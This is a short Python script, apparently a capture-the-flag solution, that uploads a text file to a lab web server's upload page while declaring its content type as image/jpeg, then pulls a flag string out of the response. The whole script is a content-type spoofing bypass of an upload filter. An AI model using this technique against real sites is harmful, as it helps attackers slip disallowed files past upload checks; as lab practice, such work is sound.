import requests
url = "http://192.168.64.6/index.php?page=upload"

files = {
    "uploaded": ("file.txt", open("./file.txt", "rb"), "image/jpeg"),
}

data = {
    "Upload": "Upload",
}
# update content type to multipart/form-data


response = requests.post(url, files=files, data=data)
# print(response.text.find("flag")

# /// grep flag 
position = response.text.find("flag")+10
print(response.text[position
                    :position+64])

